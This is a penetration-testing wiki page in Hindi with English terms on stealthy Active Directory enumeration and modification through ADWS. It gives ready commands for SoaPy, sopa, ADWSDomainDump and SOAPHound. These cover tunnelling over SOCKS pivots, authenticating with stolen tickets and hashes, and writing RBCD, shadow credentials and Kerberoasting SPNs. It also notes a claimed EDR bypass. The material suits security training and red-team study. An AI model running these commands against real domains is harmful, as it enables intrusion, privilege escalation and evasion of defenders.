# Active Directory Web Services (ADWS) Enumeration और Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS क्या है?

Active Directory Web Services (ADWS), **Windows Server 2008 R2 के बाद से हर Domain Controller पर डिफ़ॉल्ट रूप से enabled** है और TCP **9389** पर listen करता है। नाम के बावजूद, इसमें **HTTP शामिल नहीं है**। इसके बजाय, यह service proprietary .NET framing protocols के stack के ज़रिए LDAP-जैसा data उपलब्ध कराती है:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

क्योंकि traffic इन binary SOAP frames के अंदर encapsulate होता है और एक uncommon port से गुजरता है, इसलिए **ADWS के ज़रिए enumeration की classic LDAP/389 और 636 traffic की तुलना में inspect, filter या signature किए जाने की संभावना बहुत कम होती है**। Operators के लिए इसका मतलब है:<sup>[[1]](#references)[[7]](#references)</sup>

* ज़्यादा stealthy recon – Blue teams अक्सर LDAP queries पर ध्यान केंद्रित करती हैं।
* **Non-Windows hosts (Linux, macOS)** से SOCKS proxy के ज़रिए 9389/TCP tunnel करके data collect करने की सुविधा।
* वही data जो LDAP के ज़रिए मिलता है (users, groups, ACLs, schema आदि), और **writes** करने की क्षमता (जैसे **RBCD** के लिए `msDs-AllowedToActOnBehalfOfOtherIdentity`)।

ADWS interactions, WS-Enumeration के ज़रिए लागू किए जाते हैं: हर query एक `Enumerate` message से शुरू होती है, जो LDAP filter/attributes निर्धारित करता है और `EnumerationContext` GUID लौटाता है। इसके बाद एक या अधिक `Pull` messages आते हैं, जो server द्वारा तय की गई result window तक results stream करते हैं।<sup>[[7]](#references)</sup> Contexts लगभग 30 मिनट बाद expire हो जाते हैं, इसलिए state खोने से बचने के लिए tooling को results page करने या filters को split करने (हर CN के लिए prefix queries) की ज़रूरत होती है।<sup>[[8]](#references)</sup> Security descriptors माँगते समय, SACLs हटाने के लिए `LDAP_SERVER_SD_FLAGS_OID` control specify करें; अन्यथा ADWS अपने SOAP response से `nTSecurityDescriptor` attribute हटा देता है।

> NOTE: ADWS का इस्तेमाल कई RSAT GUI/PowerShell tools भी करते हैं, इसलिए traffic वैध admin activity में घुल-मिल सकता है।

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy), **पूरे ADWS protocol stack का pure Python में re-implementation** है। यह NBFX/NBFSE/NNS/NMF frames को byte-for-byte तैयार करता है, जिससे .NET runtime का इस्तेमाल किए बिना Unix-जैसे systems से data collect किया जा सकता है।<sup>[[1]](#references)[[2]](#references)</sup>

### मुख्य विशेषताएँ

* **SOCKS के ज़रिए proxying** को support करता है (C2 implants से इस्तेमाल करने के लिए उपयोगी)।
* LDAP `-q '(objectClass=user)'` जैसे fine-grained search filters।
* RBCD, SPNs, account flags और key credentials के लिए targeted **write** operations।<sup>[[2]](#references)</sup>
* SOAPy output को **BOFHound** parse कर सकता है और BloodHound में import किया जा सकता है।<sup>[[2]](#references)[[3]](#references)</sup>
* जब इंसानों के लिए पढ़ना आसान बनाना हो, तब timestamps / `userAccountControl` को बेहतर ढंग से दिखाने के लिए `--parse` flag।<sup>[[2]](#references)</sup>

### Targeted collection flags और write operations

SoaPy में चुने हुए switches शामिल हैं, जो ADWS के ज़रिए LDAP hunting के सबसे आम tasks को दोहराते हैं: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, साथ ही custom pulls के लिए raw `--query` / `--filter` options। इनके साथ `--rbcd <source>` (`msDs-AllowedToActOnBehalfOfOtherIdentity` set करता है), `--spn <service/cn>` (targeted Kerberoasting के लिए SPN staging) और `--asrep` (`userAccountControl` में `DONT_REQ_PREAUTH` flip करता है) जैसे write primitives का इस्तेमाल करें।<sup>[[2]](#references)</sup>

ऐसी targeted SPN hunt का उदाहरण, जो केवल `samAccountName` और `servicePrincipalName` लौटाती है:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

उन्हीं host/credentials का उपयोग करके निष्कर्षों को तुरंत weaponise करें: `--rbcds` से पहले से RBCD के लिए कॉन्फ़िगर किए गए objects dump करें, फिर Resource-Based Constrained Delegation chain तैयार करने के लिए `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` लागू करें (पूरे abuse path के लिए [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) देखें)।<sup>[[2]](#references)</sup>

### इंस्टॉलेशन (ऑपरेटर होस्ट)

अपस्ट्रीम repository से मौजूदा SOAPy CLI इंस्टॉल करें; Unix-जैसे सिस्टम पर executable का नाम case-sensitive होता है।<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### SOCKS pivot के माध्यम से केवल ticket से collection

यदि foothold से Kerberos ticket मिलता है, लेकिन plaintext password नहीं, तो [Pass the Ticket](pass-the-ticket.md) में बताए अनुसार `.kirbi` ticket को `ccache` में बदलें, फिर SOAPy को उस cache की ओर point करें। DC की LDAP service के लिए ticket का उपयोग documented SOAPy ADWS workflow में किया जा सकता है; ADWS और Kerberos—दोनों का traffic pivot के माध्यम से route करें।<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### ADWS के माध्यम से Shadow credentials

यदि मौजूदा principal किसी target object के `msDS-KeyCredentialLink` में लिख सकता है, तो SOAPy, ADWS के माध्यम से key credential जोड़ सकता है और उससे संबंधित PFX export कर सकता है। पूरे attribute को clear करने के बजाय, सटीक रूप से हटाने के लिए लौटाए गए DeviceID को रिकॉर्ड करें। [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md) में बताए अनुसार PKINIT के लिए PFX का उपयोग करें।<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* `ldapdomaindump` का Fork, जो LDAP-signature detections कम करने के लिए LDAP queries की जगह TCP/9389 पर ADWS calls का उपयोग करता है।
* `--force` पास न किए जाने पर 9389 की शुरुआती reachability check करता है (यदि port scans noisy/filtered हों, तो probe छोड़ देता है)।
* README में Microsoft Defender for Endpoint और CrowdStrike Falcon के विरुद्ध सफल bypass का परीक्षण किया गया है।<sup>[[4]](#references)</sup>

### इंस्टॉलेशन

```bash
pipx install .
```

### उपयोग

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

आम आउटपुट में 9389 की reachability check, ADWS bind, और dump शुरू/समाप्त होने के लॉग दर्ज होते हैं:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Golang में ADWS के लिए एक व्यावहारिक client

soapy की तरह, [sopa](https://github.com/Macmod/sopa) Golang में ADWS protocol stack (MS-NNS + MC-NMF + SOAP) लागू करता है और ऐसे ADWS calls जारी करने के लिए command-line flags उपलब्ध कराता है:<sup>[[5]](#references)</sup>

* **Object search और retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` और `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* और अन्य, जैसे `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` आदि।

### Protocol mapping की मुख्य बातें

* LDAP-style searches, attribute projection, scope control (Base/OneLevel/Subtree) और pagination के साथ **WS-Enumeration** (`Enumerate` + `Pull`) के ज़रिए जारी की जाती हैं।
* Single-object fetch के लिए **WS-Transfer** `Get` का उपयोग होता है; attribute changes के लिए `Put` और deletions के लिए `Delete` का।
* Built-in object creation में **WS-Transfer ResourceFactory** का उपयोग होता है; custom objects के लिए YAML templates द्वारा संचालित **IMDA AddRequest** का।
* Password operations, **MS-ADCAP** actions (`SetPassword`, `ChangePassword`) हैं।<sup>[[5]](#references)</sup>

### बिना authentication के metadata discovery (mex)

ADWS बिना credentials के WS-MetadataExchange उपलब्ध कराता है, जो authentication से पहले exposure की पुष्टि करने का एक तेज़ तरीका है:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### DNS/DC डिस्कवरी और Kerberos टार्गेटिंग नोट्स

यदि `--dc` नहीं दिया गया है और `--domain` प्रदान किया गया है, तो Sopa SRV के ज़रिए DCs का पता लगा सकता है। यह इस क्रम में क्वेरी करता है और सबसे अधिक प्राथमिकता वाले टार्गेट का उपयोग करता है:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

सेगमेंटेड environments में failures से बचने के लिए, operational रूप से DC-controlled resolver को प्राथमिकता दें:

* `--dns <DC-IP>` का उपयोग करें, ताकि **सभी** SRV/PTR/forward lookups DC DNS के माध्यम से हों।
* UDP blocked होने पर या SRV answers बड़े होने पर `--dns-tcp` का उपयोग करें।
* यदि `--dc` एक IP है, तो sopa हमेशा **reverse PTR** lookup करता है: Kerberos के बिना भी ADWS `wsa:To` address filter के लिए FQDN आवश्यक है। यदि reverse zone मौजूद नहीं है, तो सीधे DC FQDN दें।<sup>[[5]](#references)</sup>

उदाहरण (IP + Kerberos, DC के माध्यम से DNS को force करके):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Auth material के विकल्प

Plaintext passwords के अलावा, sopa ADWS auth के लिए **NT hashes**, **Kerberos AES keys**, **ccache**, और **PKINIT certificates** (PFX या PEM) को support करता है। `--aes-key`, `-c` (ccache) या certificate-based विकल्पों का उपयोग करने पर Kerberos स्वतः implied होता है।<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Templates के ज़रिए Custom Object बनाना

मनमानी object classes के लिए, `create custom` command एक YAML template लेता है, जो IMDA `AddRequest` से map होता है:<sup>[[5]](#references)</sup>

* `parentDN` और `rdn` container और relative DN तय करते हैं।
* `attributes[].name` में `cn` या namespaced `addata:cn` दिया जा सकता है।
* `attributes[].type` में `string|int|bool|base64|hex` या स्पष्ट `xsd:*` स्वीकार्य हैं।
* `ad:relativeDistinguishedName` या `ad:container-hierarchy-parent` **शामिल न करें**; sopa इन्हें inject करता है।
* `hex` values को `xsd:base64Binary` में बदला जाता है; खाली strings सेट करने के लिए `value: ""` इस्तेमाल करें।

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) एक .NET collector है, जो सभी LDAP interactions को ADWS के अंदर रखता है और BloodHound v4-compatible JSON emit करता है। यह एक बार `objectSid`, `objectGUID`, `distinguishedName` और `objectClass` का पूरा cache बनाता है (`--buildcache`), फिर high-volume `--bhdump`, `--certdump` (ADCS) या `--dnsdump` (AD-integrated DNS) passes के लिए इसे दोबारा इस्तेमाल करता है, ताकि केवल लगभग 35 critical attributes ही DC से बाहर जाएँ। AutoSplit (`--autosplit --threshold <N>`) बड़े forests में 30-minute EnumerationContext timeout से नीचे रहने के लिए queries को CN prefix के आधार पर अपने-आप shards में बाँटता है।<sup>[[8]](#references)</sup>

Domain-joined operator VM पर सामान्य workflow:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Export किए गए JSON slots सीधे SharpHound/BloodHound workflows में इस्तेमाल करें—आगे graphing के विचारों के लिए [BloodHound methodology](bloodhound.md) देखें। AutoSplit, query count को ADExplorer-style snapshots से कम रखते हुए, SOAPHound को multi-million object वाले forests में resilient बनाता है।

## Stealth AD Collection Workflow

यह workflow दिखाता है कि Linux से ADWS के ज़रिए **domain और ADCS objects** को enumerate करके, उन्हें BloodHound JSON में कैसे convert करें और certificate-based attack paths की तलाश कैसे करें:

1. **लक्ष्य network से अपने box तक 9389/TCP tunnel करें** (जैसे Chisel, Meterpreter, SSH dynamic port-forward आदि के ज़रिए)। Raw TCP client को SOCKS के माध्यम से route करने के लिए `proxychains4 SOAPy ...` चलाएँ (`proxychains4.conf` में SOCKS5 address configure करें); `HTTPS_PROXY` इस non-HTTP protocol को proxy नहीं करता।<sup>[[9]](#references)</sup>

2. **रूट domain object एकत्र करें:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Configuration NC से ADCS-संबंधित ऑब्जेक्ट्स एकत्र करें:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **BloodHound में रूपांतरित करें:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **ZIP अपलोड करें** BloodHound GUI में और certificate escalation paths (ESC1, ESC8, आदि) देखने के लिए `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` जैसी cypher queries चलाएँ।

### `msDs-AllowedToActOnBehalfOfOtherIdentity` लिखना (RBCD)

Target computer object पर write access होने पर, raw security-descriptor string के बजाय SOAPy का RBCD action इस्तेमाल करें। यहाँ `WEBSRV01$` नियंत्रित source है और `FILE01$` वह target है जिसका attribute बदलता है।<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Kerberos S4U chain को [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) में जारी रखें।

## Tooling Summary

| उद्देश्य | Tool | Notes |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch logs को convert करता है |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | इसे उसी SOCKS के ज़रिए proxy किया जा सकता है |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | ज्ञात ADWS endpoints के साथ interface करने वाला generic client - enumeration, object creation, attribute modifications और password changes की सुविधा देता है |



## References

- [1] [SpecterOps – SOAP(y) का उपयोग ज़रूर करें – ADWS का उपयोग करके stealthy AD collection के लिए operators की guide](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – ADWS के ज़रिए Active Directory environments की stealthy enumeration](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – ADWS के ज़रिए Active Directory data collect करने वाला SOAPHound tool](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [SOAPy Wiki – Recon](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [SOAPy Wiki – Post-Exploitation](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
